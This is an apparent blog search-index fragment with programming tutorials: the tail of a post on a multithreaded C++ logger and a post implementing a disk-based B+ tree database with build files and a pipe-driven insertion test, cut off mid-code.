std::memory_order_seq_cst);}std::memory_order_seq_cst enforces the strongest ordering guarantees, ensuring that all memory accesses performed before the atomic operation are visible to all threads in the program in the order they were issued. The init function might be called from multiple threads concurrently. Without seq_cst order, another thread could potentially see an inconsistent state of the atomic_logger.Severity LevelUse enum class LogSeverity to represent severity levels.#ifndef BASE_LOG_SEVERITY_H__#define BASE_LOG_SEVERITY_H__#include &lt;cstdint&gt;namespace slog{    enum class LogSeverity : uint8_t {         DEBUG,         INFO,         ERROR,         WARN,         FATAL     };}#endifLog Line TimeUse std::chrono to porovide precise timestamp information for logging.#ifndef SLOGTIME_H#define SLOGTIME_H#include &lt;chrono&gt;namespace slogtime{    class LogLineTime{    public:        LogLineTime();        explicit LogLineTime(std::chrono::system_clock::time_point now);        const std::chrono::system_clock::time_point&amp; when() const noexcept{return timestamp;}        int sec() const noexcept{return tm_.tm_sec;}        int usec() const noexcept{return usecs.count();}        int min() const noexcept{return tm_.tm_min;}        int hour() const noexcept{return tm_.tm_hour;}        int day() const noexcept{return tm_.tm_mday;}        int month() const noexcept{return tm_.tm_mon + 1;}        int year() const noexcept{return tm_.tm_year + 1900;}        int dayOfWeek() const noexcept{return tm_.tm_wday;}        int dayInYear() const noexcept{return tm_.tm_yday;}        int dst() const noexcept{return tm_.tm_isdst;}        std::chrono::seconds gmtoffset() const noexcept{return gmtoffset_;}        const std::tm&amp; tm() const noexcept{return tm_;}    private:        std::tm tm_{};  // time of creation of LogLine        std::chrono::system_clock::time_point timestamp;        std::chrono::microseconds usecs;        std::chrono::seconds gmtoffset_;    };}#endif // SLOGTIME_HLogLineTime::LogLineTime() : LogLineTime(std::chrono::system_clock::now()) {}LogLineTime::LogLineTime(std::chrono::system_clock::time_point now) : timestamp(now) {    time_t tt = std::chrono::system_clock::to_time_t(now);    gmtoffset_ = std::chrono::seconds(std::localtime(&amp;tt)-&gt;tm_gmtoff);    std::tm* ptm = std::localtime(&amp;tt);    tm_ = *ptm;    usecs = std::chrono::duration_cast&lt;std::chrono::microseconds&gt;(now - std::chrono::system_clock::from_time_t(tt));}slogtime::LogLineTime now; int hour = now.hour();int minute = now.min();std::cout &lt;&lt; \"Current time: \" &lt;&lt; hour &lt;&lt; \":\" &lt;&lt; minute &lt;&lt; std::endl;Stream to Stringreinterpret_castreinterpret_cast is a cast operator that performs a low-level, non-portable reinterpretation of the bit pattern of an object. It essentially treats the memory occupied by one data type as if it held a different data type. This means it doesn’t perform any type conversions or checks. We usually use reinterpret_cast to cast between different pointer types. In some low-level operations such as accessing raw memories(e.g., memory-mapped I/O), memory management, reinterpret_cast is also widely used. However, incorrect use can lead to undefined behavior, crashes, and security vulnerabilities. The behavior of reinterpret_cast can be platform-specific due to differences in memory representations (e.g., endianness).void LogLine::stream_to_string(std::ostream&amp; s){    char* data = !heap_buffer ? stack_buffer : heap_buffer.get();    const char* const end = data + used_bytes;    slogtime::LogLineTime timenow = *reinterpret_cast&lt;slogtime::LogLineTime*&gt;(data);    data += sizeof(slogtime::LogLineTime);        std::thread::id threadid = *reinterpret_cast&lt;std::thread::id*&gt;(data);    data += sizeof(std::thread::id);    string_literal_t file = *reinterpret_cast&lt;string_literal_t*&gt;(data);    data += sizeof(string_literal_t);    string_literal_t function = *reinterpret_cast&lt;string_literal_t*&gt;(data);    data += sizeof(string_literal_t);    uint32_t line = *reinterpret_cast&lt;uint32_t*&gt;(data);     data += sizeof(uint32_t);    LogSeverity loglevel = *reinterpret_cast&lt;LogSeverity*&gt;(data);    data += sizeof(LogSeverity);            s &lt;&lt; '[' &lt;&lt; timenow.year() &lt;&lt; '-' \\             &lt;&lt; timenow.month() &lt;&lt; '-' \\             &lt;&lt; timenow.day() &lt;&lt; '-' \\             &lt;&lt; timenow.hour() &lt;&lt; timenow.min() &lt;&lt; timenow.sec();       s &lt;&lt; '[' &lt;&lt; level_to_string(loglevel) &lt;&lt; ']'      &lt;&lt; '[' &lt;&lt; threadid &lt;&lt; ']'      &lt;&lt; '[' &lt;&lt; file.s      &lt;&lt; ':' &lt;&lt; function.s      &lt;&lt; ':' &lt;&lt; line &lt;&lt; \"] \";    stream_to_string(s, data, end);    s &lt;&lt; std::endl;    if (loglevel == LogSeverity::FATAL) {        s.flush();    }      }DecodeGeneric Template:template&lt;typename T&gt;char* decode(std::ostream&amp; s, char* data, T* dummy){    T arg = *reinterpret_cast&lt;T*&gt;(data);    s &lt;&lt; arg;    return data + sizeof(T);}T* dummy is a pointer to a dummy object of type T. This parameter is used to provide type information to the compiler during template instantiation.Specialization for LogLine::string_literal_t:template&lt;&gt;char* decode(std::ostream&amp; s, char* data, LogLine::string_literal_t* dummy){    LogLine::string_literal_t sliteral = *reinterpret_cast&lt;LogLine::string_literal_t*&gt;(data);    s &lt;&lt; sliteral.s;    return data + sizeof(LogLine::string_literal_t);}s &lt;&lt; sliteral.s; writes the actual string (sliteral.s) to the output stream.Specialization for char*:template&lt;&gt;char* decode(std::ostream&amp; s, char* data, char** dummy){    while(*data != '\\0'){        s &lt;&lt; *data;        ++data;    }    return ++data;}return ++data; returns a pointer to the position after the null terminator.Types DefinitionAll the types to be encoded/decoded is defined in a tuple:typedef std::tuple&lt;char, char*, int32_t, int64_t, uint32_t, uint64_t, double, LogLine::string_literal_t&gt; DataTypes;Tuple HelperA tuple helper is used to locate different types in the tuple:template&lt;typename T, typename Tuple&gt;struct TupleIndexHelper;template &lt;typename T&gt;struct TupleIndexHelper&lt;T, std::tuple&lt;&gt;&gt;{    static constexpr const std::size_t value = 0; };template&lt;typename T, typename...Types&gt;struct TupleIndexHelper&lt;T, std::tuple&lt;T, Types...&gt;&gt;{    static constexpr std::size_t value = 0;};template&lt;typename T, typename U, typename...Types&gt;struct TupleIndexHelper&lt;T, std::tuple&lt;U, Types...&gt;&gt;{    static constexpr std::size_t value = 1 + TupleIndexHelper&lt;T, std::tuple&lt;Types...&gt;&gt;::value;};  // recursive steps to find Type indexstream_to_string Recursivevoid LogLine::stream_to_string(std::ostream&amp; s, char* start, const char* const end){    if(start == end)    return;    int id = static_cast&lt;int&gt;(*start);    start++;            switch(id){        case 0:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;0, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 1:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;1, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 2:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;2, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 3:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;3, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 4:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;4, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 5:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;5, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 6:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;6, DataTypes&gt;::type*&gt;(nullptr)), end);            return;        case 7:            stream_to_string(s, decode(s, start, static_cast&lt;std::tuple_element&lt;7, DataTypes&gt;::type*&gt;(nullptr)), end);            return;    }}MacrosLog Macrosoperator+= is used to add one log line to Slog.std::memory_order_acquire ensures that the acquired pointer is up-to-date and that any operations on the logger after acquiring the pointer will be performed in order.struct Slog{    bool operator+=(LogLine&amp; logline);};bool Slog::operator+=(LogLine&amp; logline){    atomic_logger.load(std::memory_order_acquire) -&gt; add(std::move(logline));    return true;}#define SLOG(LEVEL) slog::Slog() += slog::LogLine(LEVEL, __FILE__, __func__, __LINE__)#define LOG_DEBUG SLOG(slog::LogSeverity::DEBUG)#define LOG_INFO SLOG(slog::LogSeverity::INFO)#define LOG_ERROR SLOG(slog::LogSeverity::ERROR)#define LOG_WARN SLOG(slog::LogSeverity::WARN)#define LOG_FATAL SLOG(slog::LogSeverity::FATAL)Log messages with a stream style:LOG_INFO &lt;&lt; info &lt;&lt; 123 &lt;&lt; 12.34;LOG_FATAL &lt;&lt; \"fatal error: \" &lt;&lt; str;Assert MacrosIn most cases, assert functions can be implemented using macros.#define CHECK(condition) \\    if (!(condition)){ \\        LOG_FATAL &lt;&lt; \"CHECK failed: \" &lt;&lt; #condition; \\    }Use std::abort(); to abort the program. An error will be shown:zsh IOT instruction (core dumped)Check pointer:#define CHECK_P(ptr) \\    if ((ptr) == nullptr){ \\        LOG_WARN&lt;&lt; \"CHECK_P failed: pointer \" &lt;&lt; #ptr &lt;&lt; \" is null\"; \\    }Check string:bool strcasecmp(const char* s1, const char* s2) {    while (*s1 &amp;&amp; *s2) {        if (tolower(*s1) != tolower(*s2)) {            return false;        }        s1++;        s2++;    }    return *s1 == *s2;  }#define CHECK_STREQ(str1, str2) \\    if (strcmp(str1, str2) != 0) { \\        LOG_WARN &lt;&lt; \"CHECK_STREQ failed: \\\"\" &lt;&lt; str1 &lt;&lt; \"\\\" != \\\"\" &lt;&lt; str2 &lt;&lt; \"\\\"\"; \\    }#define CHECK_STREQ_CASE(str1, str2) \\    if (!strcasecmp(str1, str2)) { \\        LOG_WARN &lt;&lt; \"CHECK_STREQ_CASE failed: \\\"\" &lt;&lt; str1 &lt;&lt; \"\\\" != \\\"\" &lt;&lt; str2 &lt;&lt; \"\\\"\"; \\    }Test the loggerTest the logger in a simple multi-thread environment:#include \"include/slog.h\"#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;ctime&gt;void benchmark(){    const char* const str = \"benchmark\";    auto begin = std::chrono::high_resolution_clock::now();    for(int i = 0; i &lt; 100000; i++){        LOG_INFO &lt;&lt; \"Logging-\" &lt;&lt; i &lt;&lt; \"-double-\" &lt;&lt; -99.876 &lt;&lt; \"-uint64-\" &lt;&lt; (uint64_t)i;    }    auto end = std::chrono::high_resolution_clock::now();    auto duration = std::chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(end - begin);    long int avg = duration.count() / 100000;    printf(\"Avg: %ld\\n\", avg);    printf(\"Total: %ld\\n\", duration.count());}template&lt;typename F&gt;void create_thread(F&amp;&amp; f, int cnt){    std::vector&lt;std::thread&gt;threads;    for(int i = 0; i &lt; cnt; i++){        threads.emplace_back(f);    }    for(int i = 0; i &lt; cnt; i++){        threads[i].join();    }}int main(){    slog::init(\"/tmp/log/\", \"log\", 8);    for(auto threads:{1,2,3}){        create_thread(benchmark, threads);    }    LOG_INFO &lt;&lt; \"HELLO\";    int a=1;    int b=2;    CHECK_EQ_F(1,2);    return 0;}"
  },
  
  {
    "title": "B+ Tree Database in Modern C++",
    "url": "/posts/database/",
    "categories": "C/C++",
    "tags": "C/C++, Database, Linux",
    "date": "2024-12-05 00:00:00 +0900",
    





    
    "snippet": "What is B+ TreeA B+ Tree is an m-ary tree with a variable but often large number of children per node.A B+ Tree often consists of a root, internal nodes and leaf nodes. It can be viewed as a variat...",
    "content": "What is B+ TreeA B+ Tree is an m-ary tree with a variable but often large number of children per node.A B+ Tree often consists of a root, internal nodes and leaf nodes. It can be viewed as a variation of B-Tree in which each node contains only keys instead of key-value pairs, and to which an additional level is added at the buttom with linked leaves.The primary value of a B+ tree is in storing data for efficient retrieval in a block-oriented filesystems. XFS, BFS, NSS, etc. all use B+ Tree for metadata indexing; BFS and NTFS also uses B+ Tree for storing directories.Features of B+ Tree      Balanced: B+ Tree is self-balancing, which means that as the record is inserted or removed from the tree, it should be able to automatically adjust itself to rebalance its structure and keep the height low.        Multi-level: B+ Tree is multi-level structure, with a root node at the top and multiple levels of internal nodes below it. Only the leaf nodes at the bottom level contains the actual data.        Ordered: B+ Tree is ordered, which makes it easier to perform a search and other operations that require sorted data.        Fan-out: B+ Tree has a high fan-out, which means that each node contains many child nodes. This reduces the height of the tree.  Data StructureTo make it easier to manage the data, binary storage of records will be used and the database files will be stored under ./database with a .bin extension. Database operations will be disk-based, using a 50th order B+ Tree, a self-balancing multiplexed search tree to store the data.Define a key_t to represent the key, initialized to the string char k[16], the keyCmp function is used to compare the size of the two key_t, overload the operators based on the keyCmp, and package them into a macro, for more convenient to compare:#define OPERATOR_RELOAD (type) #define KEYCMP_OPERATOR_RELOADDefine a value_t to represent the value, which is char name[256], int value (the integer value entered by the user, which can be age, number, date, etc.) and char data[256].In include/bplus.h, maintain a meta_t structure for storing metadata about the database, which will contain: order (number of orders), height, key_size, value_size, internal_num, leaf_num, root_offset, leaf_offset, slot (available slot offset).Maintains an index_t structure for storing indexes, containing key and child.Maintains an internal_t structure for storing internal nodes (all nodes except root and leaves) containing parent (parent offset), next (next internal node offset), prev, num (number of children), children[BPLUS_ORDER] (an array of children, of size is the tree order, used to store the index)Maintains a leaf_t for storing leaf nodes, containing parent (parent offset), next (next node offset), prev, num (number of children), children[BPLUS_ORDER].Maintains a record_t structure for storing records, containing key and value.Create a B+ TreeInitialization      Init the meta        Init root and leaf        unmap  // bplus.cppvoid BPlusTree::initEmpty(){    // init meta    memset(&amp;meta, 0, sizeof(meta_t));    meta.order = BPLUS_ORDER;    meta.value_size = sizeof(value_t);    meta.key_size = sizeof(key_t);    meta.height = 1;    meta.slot = OFFSET_BLOCK;    // init root node    internal_t root;    root.parent = 0;    root.prev = root.next = 0;    meta.root_offset = alloc(&amp;root);    // init leaf    leaf_t leaf;    leaf.next = leaf.prev = 0;    leaf.parent = meta.root_offset;    root.children[0].child = alloc(&amp;leaf);    meta.leaf_offset = root.children[0].child;    // unmap to disk    unmap(&amp;meta, OFFSET_META);    unmap(&amp;root, meta.root_offset);    unmap(&amp;leaf, root.children[0].child);}Selection  Time Complexity: O(logn)  Space complexity: O(1)// bplus.cppoff_t BPlusTree::searchIndex(const key_t&amp; key) const{    off_t index = meta.root_offset;    int height = meta.height;    while(height &gt; 1){        internal_t node;        map(&amp;node, index);        index_t *i = std::upper_bound(begin(node), end(node) - 1, key);        index = i -&gt; child;        height--;    }    return index;}off_t BPlusTree::searchLeaf(off_t index, const key_t&amp; key) const{    internal_t node;    map(&amp;node, index);    index_t *i = std::upper_bound(begin(node), end(node) - 1, key);    return i -&gt; child;}int BPlusTree::searchRange(key_t *left, const key_t&amp; right, value_t *values, size_t max, bool *next) const{    if(left == NULL || right &lt; *left){        return -1;    }    off_t off_left = searchLeaf(*left);    off_t off_right = searchLeaf(right);    off_t off = off_left;    size_t i = 0;    record_t *b_rec, *e_rec;    leaf_t leaf;    while(off != off_right &amp;&amp; off != 0 &amp;&amp; i &lt; max){        map(&amp;leaf, off);        if(off_left == off){            b_rec = find(leaf, *left);        }else{            b_rec = begin(leaf);        }        e_rec = leaf.children + leaf.num;        for(; b_rec != e_rec &amp;&amp; i &lt; max; b_rec++, i++){            values[i] = b_rec -&gt; value;        }        off = leaf.next;    }    if(i &lt; max){        map(&amp;leaf, off_right);        b_rec = find(leaf, *left);        e_rec = std::upper_bound(begin(leaf), end(leaf), right);        for(; b_rec != e_rec &amp;&amp; i &lt; max; b_rec++, i++){            values[i] = b_rec -&gt; value;        }    }    if(next != NULL){        if(i == max &amp;&amp; b_rec != e_rec){            *next = true;            *left = b_rec -&gt; key;        }else{            *next = false;        }    }    return i;}    int BPlusTree::search(const key_t&amp; key, value_t *value) const{    leaf_t leaf;    map(&amp;leaf, searchLeaf(key));    record_t *record = find(leaf, key);    if(record != leaf.children + leaf.num){        *value = record -&gt; value;        return keyCmp(record -&gt; key, key);    }else{        return -1;    }}searchIndex is index traversal function, using the height get from meta establish the loop,map each index searched and with the help of std::upper_bound, find and return the top of the index (if not found, then return to the end of the sequence and enter the next loop )searchLeaf is a leaf search function, the arguments are the index obtained from searchIndex and the target key to be selected, Map the searched index to the node, again using std::upper_bound to find and return the child of the leaf node.  In order to simplify the call, overload the function:// include/bplus.hoff_t searchLeaf(const key_t &amp;key) const{    return searchLeaf(searchIndex(key), key);}In the function search, call searchLeaf(key) to find the leaf node where the key of the target record is located, and map to leaf, through the std::upper_bound to find the key, we need to judge whether the record searched is not the last, that is, successfully searched for the target record, then take the value of the record and assigned to the memory pointed to by the value passed into the function, the search returns the value of keyCmp(record → key, key). If the searched record is the last, that is, did not find the target record, then return -1 to error handling.Insertion  Time Complexity: O(logn)  Space complexity: O(1)In a B+ Tree, every record is inserted into the bottom level. The insertion will be in increasing order only if there is no overflow.If there is overflow in leaf node, we should split the node into two nodes, each node contains half of the tree’s order. First node contains ceil((order-1)/2) values.If there is overflow in internal nodes, we should also split the node and first node contains ceil(m/2)-1 values.// bplus.cppvoid BPlusTree::insertRecNoSplit(leaf_t *leaf, const key_t&amp; key, const value_t&amp; value){    record_t *where = std::upper_bound(begin(*leaf), end(*leaf), key);    std::copy_backward(where, end(*leaf), end(*leaf) + 1);    where -&gt; key = key;    where -&gt; value = value;    leaf -&gt; num++;}void BPlusTree::insertKeyNoSplit(internal_t&amp; node, const key_t&amp; key, off_t value){    index_t *where = std::upper_bound(begin(node), end(node) - 1, key);    std::copy_backward(where, end(node), end(node) + 1);    where -&gt; key = key;    where -&gt; child = (where + 1) -&gt; child;    (where + 1) -&gt; child = value;    node.num++;}void BPlusTree::insertKey(off_t offset, const key_t&amp; key, off_t old, off_t after){    if(offset == 0){  // create root        internal_t root;        root.next = root.prev = root.parent = 0;        meta.root_offset = alloc(&amp;root);        meta.height++;        root.num = 2;        root.children[0].key = key;        root.children[0].child = old;        root.children[1].child = after;        unmap(&amp;meta, OFFSET_META);        unmap(&amp;root, meta.root_offset);        resetParent(begin(root), end(root), meta.root_offset);        return;    }    internal_t node;    map(&amp;node, offset);    if(node.num == meta.order){   // full split        // find split point        size_t point = (node.num - 1) / 2;        bool place_right = node.children[point].key &lt; key;        if(place_right) point++;        if(place_right &amp;&amp; key &lt; node.children[point].key) point--;        key_t mid = node.children[point].key;        internal_t new_node;        createNode(offset, &amp;node, &amp;new_node);        // split        std::copy(begin(node) + point + 1, end(node), begin(new_node));        new_node.num = node.num - point - 1;        node.num = point + 1;        if(place_right){            insertKeyNoSplit(new_node, key, after);        }else{            insertKeyNoSplit(node, key, after);        }        unmap(&amp;node, offset);        unmap(&amp;new_node, node.next);        resetParent(begin(new_node), end(new_node), node.next);        insertKey(node.parent, mid, offset, node.next);    }else{        insertKeyNoSplit(node, key, after);        unmap(&amp;node, offset);    }}int BPlusTree::insert(const key_t&amp; key, value_t value){    off_t parent = searchIndex(key);    off_t offset = searchLeaf(parent, key);    leaf_t leaf;    map(&amp;leaf, offset);    if(std::binary_search(begin(leaf), end(leaf), key))        return 1;   //find same, return    if(leaf.num == meta.order){        // full, split        leaf_t new_leaf;        createNode(offset, &amp;leaf, &amp;new_leaf);        // find split point        size_t point = leaf.num / 2;        bool place_right = leaf.children[point].key &lt; key;        if(place_right)            point++;        // split        std::copy(leaf.children + point, leaf.children + leaf.num, new_leaf.children);        new_leaf.num = leaf.num - point;        leaf.num = point;        if(place_right){            insertRecNoSplit(&amp;new_leaf, key, value);        }else{            insertRecNoSplit(&amp;leaf, key, value);        }        unmap(&amp;leaf, offset);        unmap(&amp;new_leaf, leaf.next);        insertKey(parent, new_leaf.children[0].key, offset, leaf.next);    }else{        insertRecNoSplit(&amp;leaf, key, value);        unmap(&amp;leaf, offset);    }    return 0;}insertRecNoSplit is used to handle record insertion operations that do not split nodes. This insertion operation searches for the insertion point where in the target leaf using std::upper_bound, performs an overwrite operation using std::copy_backward to shift the node after the insertion point backward to make room for the insertion of the record, and finally updates the number of children and the value, then finally update the number of leaf children.insertKeyNoSplit is used to handle index insertion operation without splitting the node, this insertion operation will search for the index insertion point where in the internal node using std::upper_bound, use std::copy_backward to perform an overwrite operation to shift the index after the insertion point backward, to make room for the index, and finally refactor the index and update the children, the children pointed to by where should be changed to the children of (where + 1) (i.e., the original children pointed to by the index at that position), and the children of (where + 1) are the passed value argument (i.e., the original children pointed to by (where+1))insertKey is used to handle key insertion operation, if the offset is 0, then create the root, if not, then insert operation, insert operation is divided into two kinds of insertion operation, one is directly without splitting insertion, that is, call insertKeyNoSplit and unmap to disk, the other when the number of nodes reaches the definition of the number of orders (meta.order), split: first find the split point, find the evenly split point (point), then create a new internal node (using the createNode), use std::copy to split and update the number of children, after splitting, and then call insertKeyNoSplit to insert the node (here, use the overloaded operator for the comparison of key_t), place_right==true insert the new node, and vice versa insert the old node), unmap to disk, and finally need to call resetParent and insertKey to adjust the parent node, to complete the insertion and the data structure rebalance operation.insert is used to deal with the insertion of records, first through the search method to locate the insertion point and the parent offset. Map offset to leaf, a run binary_search, if the same record is found, return -1, otherwise perform the insertion operation. Insertion operation is divided into two cases, if the number of records does not reach the order, that is, do not need to split, insert with the insertRecNoSplit and unmap to disk; if the number of records to reach the order,  need to split: createNode to create a new node, simple calculation to get the point, determine whether place_right, finally, start splitting. Use std::copy to split and update the children information, and insertRecNoSplit to insert and unmap to disk. Eventually, insertKey is used to insert the new leaf into the parent, further updating the parents to maintain a balanced structure.Deletion  Time Complexity: O(logn)  Space complexity: O(1)Deleting an element on a B+ tree consists of three main events: searching the node, deleting the key and balancing the tree if required.Underflow is a situation when there is less number of keys in a node than the minimum number of keys it should hold.// bplus.cppvoid BPlusTree::removeNode(T *prev, T *node){    unalloc(node, prev -&gt; next);    prev -&gt; next = node -&gt; next;    if(node -&gt; next != 0){        T next;        map(&amp;next, node -&gt; next, SIZE_NO_CHILDREN);        next.prev = node -&gt; prev;        unmap(&amp;next, node -&gt; next, SIZE_NO_CHILDREN);    }    unmap(&amp;meta, OFFSET_META);}void BPlusTree::removeIndex(off_t offset, internal_t&amp; node, const key_t&amp; key){    size_t min = meta.root_offset == offset ? 1 : meta.order / 2;    key_t index_key = begin(node) -&gt; key;    index_t *to_delete = find(node, key);    if(to_delete != end(node)){        (to_delete + 1) -&gt; child = to_delete -&gt; child;        std::copy(to_delete + 1, end(node), to_delete);    }    node.num--;    if(node.num == 1 &amp;&amp; meta.root_offset == offset &amp;&amp; meta.internal_num != 1){        unalloc(&amp;node, meta.root_offset);        meta.height--;        meta.root_offset = node.children[0].child;        unmap(&amp;meta, OFFSET_META);        return;    }   // delete root, decrease height, reset root    if(node.num &lt; min){        internal_t parent;        map(&amp;parent, node.parent);        bool borrowed = false;        if(offset != begin(parent) -&gt; child)            borrowed = borrowKey(false, node, offset);        if(!borrowed &amp;&amp; offset != (end(parent) - 1) -&gt; child)            borrowed = borrowKey(true, node, offset);        if(!borrowed){            if(offset == (end(parent) - 1)-&gt;child){                internal_t prev;                map(&amp;prev, node.prev);                index_t *where = find(parent, begin(prev) -&gt; key);                resetParent(begin(node), end(node), node.prev);                mergeKey(where, prev, node);                unmap(&amp;prev, node.prev);            }else{                internal_t next;                map(&amp;next, node.next);                index_t *where = find(parent, index_key);                resetParent(begin(next), end(next), offset);                mergeKey(where, node, next);                unmap(&amp;node, offset);            }            removeIndex(node.parent, parent, index_key);        }else{            unmap(&amp;node, offset);        }    }else{        unmap(&amp;node, offset);    }}int BPlusTree::remove(const key_t&amp; key){    internal_t parent;    leaf_t leaf;    off_t parent_off = searchIndex(key);    map(&amp;parent, parent_off);    index_t *where = find(parent, key);    off_t offset = where -&gt; child;    map(&amp;leaf, offset);    if(!std::binary_search(begin(leaf), end(leaf), key))        return -1;  // cannot find    size_t min = meta.leaf_num == 1 ? 0 : meta.order / 2;    record_t *to_delete = find(leaf, key);    std::copy(to_delete + 1, end(leaf), to_delete);    leaf.num--;    if(leaf.num &lt; min){        bool borrowed = false;        if(leaf.prev != 0)            borrowed = borrowKey(false, leaf);        if(!borrowed &amp;&amp; leaf.next != 0)            borrowed = borrowKey(true, leaf);        if(!borrowed){            key_t index_key;            if(where == end(parent) - 1){                leaf_t prev;                map(&amp;prev, leaf.prev);                index_key = begin(prev)-&gt;key;                mergeLeaf(&amp;prev, &amp;leaf);                removeNode(&amp;prev, &amp;leaf);                unmap(&amp;prev, leaf.prev);            }else{                leaf_t next;                map(&amp;next, leaf.next);                index_key = begin(leaf)-&gt;key;                mergeLeaf(&amp;leaf, &amp;next);                removeNode(&amp;leaf, &amp;next);                unmap(&amp;leaf, offset);            }            removeIndex(parent_off, parent, index_key);        }else{            unmap(&amp;leaf, offset);        }    } else {        unmap(&amp;leaf, offset);    }    return 0;}    removeNode is simple, unalloc the node (update the meta), transfer the successor of the deleted node to the predecessor, if the deleted node is not the last node, map the successor of the node, transfer the predecessor of the node to its predecessor and unmap it to disk, and finally unmap the meta, the whole operation is actually a linear table operation.removeIndex is used to remove the index, min is used as the minimum number of nodes, if it is not the root, min is half of the order. to_delete is the index for deletion, use find to locate it, if to_delete is not the last index, transfer his children to the latter index and overwrite it with std::copy, if to_delete is the root and there is only one node, then delete it directly and update root_offset to reduce the tree height to balance the tree structure. If the number of children of the node where to_delete is located is less than min, it is necessary to borrow and merge. Record the father parent, the state of whether borrowed (a boolean), if the offset is the first child of the father, borrow from the left node, and vice versa from the right node, borrowing node are implemented using borrowKey, which uses two sets of overloading to deal with leaf and internal nodes, for leaf: lender_off through the incoming boolean value from_right to determine the lender offset, with the help of this offset map it to the lender, if the lender’s children did not reach the half of the order, merge the beginning of the lender to the end of the borrower, or merge the end of the lender to the beginning of the borrower, use changeParent to change the parent after splicing data with std::copy_backward, update the children, and finally applied to disk; for internal node is much the same, just one more step, change the node pointing. After completing the borrow operation, map the node’s predecessor or successor to prev/next, use mergeKey to merge the keys, in mergeKey, use std::copy to splice the left and right, update the children, and use removeNode to remove nodes that are discarded after the merge.remove performs delete operation, use searchIndex and find to get and map parent with leaf, return -1 if the key is not found in leaf (use binary_search), determine the minimum number of nodes min, with delete point to_delete, use std::copy to override, if the number of leaf is less than the minimum number of nodes, set borrowed to indicate the state of borrowing. We need to set three judgments, if the leaf precursor is not 0, borrow from the left, if the successor is not 0, borrow from the right, after the borrowing and lending of left/right, it is still unborrowed state, the leaf precursor will be mapped to prev. Record the key, merge the leaf and the precursor into one node, delete the leaf, complete the right-merge operation. Otherwise perform the left-merge operation, after the merge operation, of course, unmap to disk. Completion of leaf deletion, need to delete in the index, call removeIndex(parent_off, parent, index_key) to realize the deletion.Update// bplus.cppint BPlusTree::update(const key_t&amp; key, value_t value){    off_t offset = searchLeaf(key);    leaf_t leaf;    map(&amp;leaf, offset);    record_t *record = find(leaf, key);    if(record != leaf.children + leaf.num){        if(key == record -&gt; key){            record-&gt;value = value;            unmap(&amp;leaf, offset);            return 0;        }else{            return 1;        }    }else{        return -1;  // not found    }}The update algorithm is implemented using update(const key_t&amp; key, value_t value), using searchLeaf to find the target offset and map it, if not found then return -1, otherwise determine whether the found record key matches the provided one, (because the essence of find is implemented as std::lower_bound. find the key may be the first key greater than the target rather than the one we need to be exactly equal to the target, so a futher judgment is necessary), match then update the value of the record, umap and return 0, does not match then return 1 error.  Time Complexity: O(logn)  Space complexity: O(1)InterfaceFor better management, design a shell-like user interface. Define to handler for commands handling.// main.cppusing CommandHandler = void(*)(const string&amp; arg);using OptionHandler = void(*)(const string&amp; arg);Use two map and lambda funtion to store correspondence of commands and handlers.// main.cppmap&lt;string, OptionHandler&gt; optionMap = {........};map&lt;string, CommandHandler&gt; commandMap = {........};After launching the program, it will firstly enter the optionLoop for database management:help                                         show help menuexit                                           exit consoleclear                                          clear screenlist                                list available databasenew {name}                            create a new databaseuse {name}                                login to databasereset {name}                                 reset databasedrop {name}                                   drop databaseUse use command to login the database and enter the second commandLoop for data management: help                                        show help menu exit                                         exit database select id {id}                             search by index select in {b},{e}                 search in range of (b,e) insert {id} {name} {value} {data}          insert a record update {id} {name} {value} {data}          update a record delete id {id}                                delete by idCompile and TestPlatform:      Linux 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux        gcc version 14.2.0 (Debian 14.2.0-8)  Make and RunWe could have a Makefile to compile the whole source:CXX = g++SRC_DIR = ./TARGET = easydbOBJ = main.o bplus.o$(TARGET):$(OBJ)\t$(CXX) -o $(TARGET) $(OBJ)\trm -rf $(OBJ)main.o:\t$(CXX) -c $(SRC_DIR)main.cppbplus.o:\t$(CXX) -c $(SRC_DIR)bplus.cppclean:\trm -rf $(OBJ) $(TARGET)  CMake is another option easy to use:cmake_minimum_required(VERSION 3.10)project(easydb)add_executable(easydb main.cpp bplus.cpp)include_directories(${PROJECT_SOURCE_DIR}/include)add_compile_options(-fexec-charset=UTF-8)add_compile_options(-finput-charset=GBK)add_compile_options(-fwide-exec-charset=UTF-8)To build the program, just simply use make. The target output will be ./easydb.Build on WindowsOn Windows, we should first setup the Mingw64. For example, we could use w64devkit-x64. Don’t forget to set the environment variable PATH to the path of w64devkit-x64’s bin folder.After successfully installing Mingw64, use cmake-gui to configure and generate the Makefile and then use make to compile the program. This will generate a executable file named easydb.exe.Test InsertionC++We can write a simple test script with shell or python to test the program, here’s an example in C++ running on Linux:// test.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;int main(){    const int num_inserts = 100000;    const char* pipe_name = \"pipe\";    mkfifo(pipe_name,0666);    std::ofstream logFile(\"time.log\");    std::streambuf *coutbuf = std::cout.rdbuf();    std::cout.rdbuf(logFile.rdbuf());    std::thread easydb_thread([pipe_name]() {        std::system(\"./easydb &lt; pipe &amp;\");    });    int fd = open(pipe_name, O_WRONLY);    auto start_time = std::chrono::high_resolution_clock::now();    auto start_duration = start_time.time_since_epoch();    auto milliseconds = std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(start_duration).count();    std::cout &lt;&lt; \"[\" &lt;&lt; milliseconds &lt;&lt; \"]: \";    std::cout &lt;&lt; \"Start insert test\" &lt;&lt; std::endl;    std::string command;    command = \"use db\\n\";        write(fd, 